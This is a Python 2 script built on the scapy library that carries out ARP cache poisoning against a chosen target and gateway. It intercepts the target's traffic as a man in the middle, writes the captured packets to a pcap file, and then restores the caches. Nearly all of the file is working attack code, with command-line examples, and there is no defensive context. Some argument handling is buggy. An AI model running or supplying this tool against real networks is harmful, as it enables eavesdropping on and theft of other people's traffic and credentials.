##This is a basic arp poisoning program using the scapy lib
from scapy.all import *
import os
import sys
import threading
import signal

##TODO: Command line parsing for global variables##

#define global variables
#interface to send arp poisoning packets out on
interface       = ""
#IP of target we will arp poison
target_ip       = ""
#IP of gateway that we will be impersonating
gateway_ip      = ""
#number of poisoned packets to send
packet_count    = ""

#define functions

#define usage text
def usage():
    print "Scapy_Arper_Local"
    print 
    print "Usage: Scapy_Arper_Local.py -i interface -t target_host -g target_gateway [-pc packet_capture_count]"
    print "-i --interface               - [Required] Name of network interface to use"
    print "-t --target                  - [Required] IP address of target machine for ARP Poisoning"
    print "-g --gateway                 - [Required] IP address of gateway we will forward packets to"
    print "-p --packets_captured       - [Optional] Number of packets to capture"
    print
    print
    print "Examples:"
    print "Scapy_Arper_Local.py -i eth0 -t 192.168.1.50 -g 192.168.1.1 -p 2500"
    print "Scapy_Arper_Local.py --interface eth0 --target 192.168.1.50 --gateway 192.168.1.1 --packets_captured 1500"
    
    sys.exit(0)


#This function returns the mac address for an IP
def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)

    #return the mac address from a response
    for s,r in responses:
        return r[Ether].src
    return None

#This funtion restores the arp cache of the target after the poisoning is completed
def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    #signals the main thread to exit
    os.kill(os.getppid(), signal.SIGINT)

#This function spews out arp poisoned packets at target
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    
    #Craft poisoned arp packet for target
    poison_target       = ARP()
    poison_target.op    = 2
    poison_target.psrc  = gateway_ip
    poison_target.pdst  = target_ip
    poison_target.hwdst = target_mac
    
    #craft poisoned arp packet for Gateway
    poison_gateway          = ARP()
    poison_gateway.op       = 2
    poison_gateway.psrc     = target_ip
    poison_gateway.pdst     = gateway_ip
    poison_gateway.hwdst    = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C] to stop."
    
    #set up loop to poison the arp cache of the target and the gateway
    while True:
        try:
            #send poison arp packets to gateway and target
            send(poison_target)
            send(poison_gateway)
            #sleep 2 seconds between sending packets
            time.sleep(2)
        except KeyboardInterrupt:
            #restore arp caches
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    print "[*] ARP Poison attack finished."
    return


#Define main()
def main():
    #import global variable into function
    global interface
    global target_ip
    global gateway_ip
    global packet_count

     #verify args were passed and if not print usage
    if not len(sys.argv[1:]):
        usage()
    #read command line args
    try:
        opts, args = getopt.getopt(sys.argv[1:], "i:t:g:p:h", 
                            ["interface", "target" ,"gateway", "packets_captured", "help"])
    #if error print it and then print usage
    except getopt.GetoptError as err:
        print str(err)
        usage()
    #loop through opts defining option as o and corresponding argument as a
    for o,a in opts:
        #if help is passed print usage
        if o in ("-h", "--help"):
            usage()
        #if interface is passed set interface to parameter
        elif o in ("-i","--interface"):
            interface = a
        #if target is passed then set target to the value of argument passed with it
        elif o in ("-t","--target"):
            target_ip = a
        #if gateway is passed then set gateway_ip to parameter
        elif o in ("-g","--gateway"):
            gateway_ip = a
        #if upload is passed set upload to value of the argument passed with it
        elif o in ("-p","--packets_captured"):
            packet_count = a
        #if none of the above trigger write an a debug exception for the unhandled options
        else:
            assert False, "Unhandled Option"


    #set interface to use in scapy
    conf.iface = interface

    #turn off output
    conf.verb = 0

    print "[*] Setting up %s interface" % interface
    
    #Get and save mac address of gateway
    gateway_mac = get_mac(gateway_ip)
    #If we are unable to get gateway's' mac address throw alert and exit; Otherwise print out the gateway's mac and proceed
    if gateway_mac is None:
        print "[!] Failed to get Gateway's MAC Address. Exiting..."
        sys.exit(1)
    else:
        print "[*] Gateway %s is at MAC Address %s" % (gateway_ip, gateway_mac)
    
    #get and save mac address of target IP
    target_mac = get_mac(target_ip)
    #If we are unable to get traget's' mac address throw alert and exit; Otherwise print out the target's' mac and proceed
    if target_mac is None:
        print "[!] Failed to get target's MAC Address.  Exiting..."
        sys.exit(1)
    else:
        print "[*] Target %s is at MAC Address %s" % (target_ip, target_mac)

    #start poisoning thread
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    #start sniffing
    try:
        print "[*] Starting sniffer for %d packets." % packet_count
        #create filter for scapy
        bpf_filter = "ip host %s" % target_ip
        #sniff packet_count number of packets
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
        #write out the packets to pcap file
        wrpcap('arper_local.pcap', packets)

        try:
            #restore the network
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            print "Network Restored.  Exiting."
            sys.exit(0)
        except:
            print "[WARN] Unable to restore arp caches.  This may lead to instability on targets."
            print "Exiting."
            sys.exit(1)

    except KeyboardInterrupt:
        print "Operation canceled by keyboard interupt."
        try:
            #restore the network
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
            print "Network Restored.  Exiting."
            sys.exit(0)
        except:
            print "[!] Unable to restore arp caches.  This may lead to instability on targets."
            print "Exiting."
            sys.exit(1)
        

main()